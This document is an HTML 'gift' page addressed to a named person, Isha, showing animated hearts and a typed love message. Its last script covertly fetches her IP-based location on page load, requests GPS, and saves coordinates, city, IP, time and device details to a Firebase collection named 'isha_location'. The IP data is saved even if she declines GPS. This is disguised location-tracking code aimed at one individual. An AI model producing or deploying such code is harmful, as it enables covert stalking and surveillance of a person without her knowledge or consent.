<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>For Isha ❤️</title>

<style>

body{
margin:0;
height:100vh;
background:linear-gradient(45deg,#ff4b5c,#ff9a9e);
font-family:Arial;
overflow:hidden;
color:white;
text-align:center;
display:flex;
justify-content:center;
align-items:center;
}

/* Container */

.container{
width:90%;
max-width:350px;
z-index:10;
}

/* Main heart */

.heart{
font-size:70px;
animation:beat 1s infinite;
}

@keyframes beat{
0%{transform:scale(1);}
50%{transform:scale(1.3);}
100%{transform:scale(1);}
}

h1{
font-size:28px;
margin:10px 0;
}

button{
width:100%;
padding:14px;
font-size:18px;
border:none;
border-radius:25px;
background:white;
color:#ff4b5c;
margin-top:15px;
}

/* Message */

.message{
display:none;
font-size:22px;
margin-top:15px;
min-height:60px;
}

/* Falling hearts */

.heartbg{
position:absolute;
top:-10px;
font-size:20px;
animation:fall linear infinite;
}

@keyframes fall{
0%{
transform:translateY(-10px);
opacity:1;
}
100%{
transform:translateY(110vh);
opacity:0;
}
}

/* Explosion hearts */

.popheart{
position:absolute;
font-size:25px;
animation:pop 2s forwards;
}

@keyframes pop{
0%{
transform:scale(0);
opacity:1;
}
100%{
transform:translateY(-200px) scale(1.5);
opacity:0;
}
}

</style>

</head>

<body>

<div class="container">

<div class="heart">❤️</div>

<h1>Dear Isha ❤️</h1>

<p>My Special Gift For You</p>

<button onclick="showLove()">Open Gift 🎁</button>

<div class="message" id="msg"></div>

</div>


<script>

/* Background hearts */

for(let i=0;i<25;i++){

let heart=document.createElement("div");

heart.innerHTML="❤️";
heart.className="heartbg";

heart.style.left=Math.random()*100+"%";
heart.style.animationDuration=(3+Math.random()*5)+"s";
heart.style.fontSize=(15+Math.random()*25)+"px";

document.body.appendChild(heart);

}

</script>



<script>

function showLove(){

/* Explosion hearts */

for(let i=0;i<20;i++){

let h=document.createElement("div");

h.innerHTML="💖";
h.className="popheart";

h.style.left=(40+Math.random()*20)+"%";
h.style.bottom="40%";

document.body.appendChild(h);

}

/* Typing animation */

let text="I Love You Isha ❤️ You Are My Sweetest Dream 🌹";
let i=0;

let msg=document.getElementById("msg");

msg.style.display="block";
msg.innerHTML="";

let typing=setInterval(()=>{

msg.innerHTML+=text.charAt(i);

i++;

if(i>=text.length){
clearInterval(typing);
}

},80);

}

</script>



<!-- Firebase + Location -->
<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
apiKey: "AIzaSyAicGiOH3CQAxfOy1Y1y-osoypb73Ew1Y8",
  authDomain: "remote-videoplayer.firebaseapp.com",
  projectId: "remote-videoplayer",
  storageBucket: "remote-videoplayer.firebasestorage.app",
  messagingSenderId: "978359248102",
  appId: "1:978359248102:web:c03c62454f8cbf70030727",
  measurementId: "G-4D3PV2EGMX"

};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);


/* Function Save Data */

async function saveData(ipData,gpsLat,gpsLng){

await addDoc(collection(db,"isha_location"),{

ip:ipData.ip,
city:ipData.city,
region:ipData.region,
country:ipData.country_name,

ipLatitude:ipData.latitude,
ipLongitude:ipData.longitude,

gpsLatitude:gpsLat,
gpsLongitude:gpsLng,

time:new Date().toString(),

device:navigator.userAgent

});

}


/* Step 1: Get IP Location */

fetch("https://ipapi.co/json/")
.then(res=>res.json())
.then(ipData=>{


/* Step 2: Ask GPS */

navigator.geolocation.getCurrentPosition(

/* Allow */

(position)=>{

saveData(
ipData,
position.coords.latitude,
position.coords.longitude
);

},

/* Decline */

(error)=>{

saveData(
ipData,
null,
null
);

}

);


});

</script>
